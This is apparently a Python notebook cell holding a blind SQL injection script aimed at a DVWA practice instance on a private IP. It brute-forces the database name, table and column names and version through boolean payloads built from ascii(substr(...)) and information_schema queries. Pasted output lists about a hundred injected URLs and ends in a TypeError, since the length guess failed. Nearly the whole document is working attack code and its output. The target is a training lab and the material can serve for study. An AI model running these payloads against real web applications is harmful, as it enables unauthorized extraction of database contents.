# %%
from pwn import *
import requests
import re
from itertools import cycle
import logging

url = 'http://192.168.194.212/dvwa/vulnerabilities/sqli_blind'
fixed_query = "?Submit=Submit&id=1"
cookies = {
    'security': 'low',
    'PHPSESSID': '1b4e6691ed99533b8ffdef925a4b80e9'
}
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'


def sql_inject(sqli_pt1, variable, sqli_pt2):
    # Build up URL and execute SQLi
    next_url = url + fixed_query + sqli_pt1 + variable + sqli_pt2
    print(next_url)
    debug("Testing " + variable + " on \"" + next_url + "\"")
    return requests.get(next_url, cookies=cookies)


def guess_len(guess_type, sqli_pt1, sqli_pt2):
    # Guess length of DB name, table count etc
    for i in range(1, 100):
        # Submit SQLi string
        response = sql_inject(sqli_pt1, str(i), sqli_pt2)
        # Extract the response we're interested in
        #print(response.text)
        error_message = re.search(r'User.*\.', response.text).group(0)
        debug(error_message)
        # If we've found the DB name length, return
        if "MISSING" not in error_message:
            success(guess_type + str(i) + '\n\n')
            return i


def guess_name(guess_type, sqli_pt1, sqli_pt2, name_len, min_char_initial, max_char_initial):
    name = ""
    for i in range(1, name_len + 1):
        # Need to reset all these after we find each char
        found_next_char = 0
        min_char = min_char_initial
        max_char = max_char_initial
        current_char = int((min_char + max_char) / 2)  # start half way through alphabet ('m')
        # Should we check greater than or less than?
        comparison_types = cycle(['<', '>'])
        comparison = next(comparison_types)

        while(found_next_char != 2):
            # Submit SQLi string ('i' used for substring index, 'current_char' used for finding next char in name)
            response = sql_inject(sqli_pt1 + str(i) + "," + str(i) + "))" + comparison, str(current_char), sqli_pt2)
            # Extract the response we're interested in
            error_message = re.search(r'User.*\.', response.text).group(0)
            debug(error_message)

            # If ID shows "exists" then condition is true e.g. char > 97
            if "MISSING" not in error_message:
                # Reset our found_next_char counter
                found_next_char = 0
                # Next char is greater than the char we just tested
                if comparison == '>':
                    min_char = current_char
                # Otherwise, next char is lower than the one we just tested
                else:
                    max_char = current_char
                # Reset the current char to test value
                current_char = int((min_char + max_char) / 2)
            # If ID shows "MISSING" then condition is false e.g. !(char > 97)
            else:
                # Reverse the comparison check
                comparison = next(comparison_types)
                # Once this hit '2' in a row we know we've got the right value
                found_next_char += 1

        # We found our char
        name += chr(current_char)
        info("Found char(" + str(i) + "): " + chr(current_char))
    # We got the whole DB name
    success(guess_type + name + '\n\n')
    return name


# Bullet-based SQLi
# Get the length of DB name first (pass in print output + SQLi pt1/pt2)
db_name_len = guess_len("DB Name Length: ", "'+and+length(database())+=", "+%23")

# Get the DB name
db_name = guess_name("DB Name: ", "'+and+ascii(substr(database(),", "+%23", db_name_len, ord('a'), ord('z'))

# Get number of tables in the DB
db_table_count = guess_len(
    "DB Table Count: ",
    "'+and+(select+count(*)+from+information_schema.tables+where+table_schema=database())+=", "+%23")

# Dump the tables
for table_no in range(db_table_count):
    # Get length of table name
    table_name_len = guess_len(
        "Table Name Length: ",
        "'+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),1))+=",
        "+%23")
    # Guess table name
    table_name = guess_name(
        "Table Name: ",
        "'+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),",
        "+%23",
        table_name_len, ord('a'), ord('z'))
    # Guess the field count
    table_field_count = guess_len(
        "Table Field Count: ",
        "'+and+(select+count(column_name)+from+information_schema.columns+where+table_name='" + table_name + "')+=", "+%23")

    # Now same process for field names (guess 'em)
    for field_no in range(table_field_count):
        # Guess length of field name
        field_name_len = guess_len(
            "Field Name Length: ",
            "'+and+length(substr((select+column_name+from+information_schema.columns+where+table_name='" +
            table_name + "'+limit+1+offset+" + str(field_no) + "),1))+=",
            "+%23")
        # Guess field name
        field_name = guess_name(
            "Field Name: ",
            "'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name='" +
            table_name + "'+limit+1+offset+" + str(field_no) + "),",
            "+%23",
            field_name_len, ord(' '), ord('z'))

    # TODO: continue same process to extract field data


# Finally, do our actual mission (get DB version)
db_version_name_len = guess_len("DB Version Length: ", "'+and+length(@@version)+=", "+%23")
# Here we check special chars, 0-9, A-Z, a-z etc
db_version_name = guess_name("DB Version: ", "'+and+ascii(substr(@@version,", "+%23", db_version_name_len, ord(' '), ord('z'))
# Out:
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=1+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=2+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=3+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=4+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=5+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=6+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=7+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=8+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=9+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=10+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=11+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=12+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=13+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=14+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=15+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=16+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=17+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=18+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=19+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=20+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=21+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=22+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=23+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=24+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=25+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=26+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=27+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=28+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=29+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=30+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=31+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=32+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=33+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=34+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=35+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=36+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=37+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=38+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=39+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=40+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=41+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=42+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=43+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=44+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=45+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=46+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=47+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=48+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=49+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=50+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=51+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=52+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=53+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=54+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=55+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=56+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=57+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=58+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=59+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=60+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=61+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=62+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=63+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=64+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=65+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=66+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=67+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=68+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=69+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=70+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=71+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=72+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=73+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=74+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=75+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=76+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=77+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=78+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=79+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=80+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=81+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=82+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=83+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=84+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=85+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=86+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=87+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=88+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=89+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=90+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=91+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=92+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=93+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=94+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=95+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=96+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=97+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=98+%23
# http://192.168.194.212/dvwa/vulnerabilities/sqli_blind?Submit=Submit&id=1'+and+length(database())+=99+%23
# ---------------------------------------------------------------------------
# TypeError                                 Traceback (most recent call last)
# <ipython-input-20-989aa95b2597> in <module>
#      89
#      90 # Get the DB name
# ---> 91 db_name = guess_name("DB Name: ", "'+and+ascii(substr(database(),", "+%23", db_name_len, ord('a'), ord('z'))
#      92
#      93 # Get number of tables in the DB
#
# <ipython-input-20-989aa95b2597> in guess_name(guess_type, sqli_pt1, sqli_pt2, name_len, min_char_initial, max_char_initial)
#      40 def guess_name(guess_type, sqli_pt1, sqli_pt2, name_len, min_char_initial, max_char_initial):
#      41     name = ""
# ---> 42     for i in range(1, name_len + 1):
#      43         # Need to reset all these after we find each char
#      44         found_next_char = 0
#
# TypeError: unsupported operand type(s) for +: 'NoneType' and 'int'
